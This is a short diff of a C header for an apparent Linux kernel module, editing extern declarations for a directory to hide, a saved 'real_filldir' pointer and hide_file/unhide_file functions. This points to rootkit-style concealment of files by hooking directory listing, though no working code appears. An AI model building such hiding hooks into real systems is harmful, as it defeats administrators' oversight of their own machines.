@@ -6,12 +6,10 @@
 #include <linux/namei.h>
 #include <linux/spinlock.h>
 
-extern char *data_fs ; //hide dir in /opt/usr/media directory
+extern char *data_fs ; //hide dir 
 extern char *dir_to_hide;
 
 extern filldir_t real_filldir;
-
-extern int g_fs_hooked;
 
 extern void hide_file(void);
 extern void unhide_file(void);
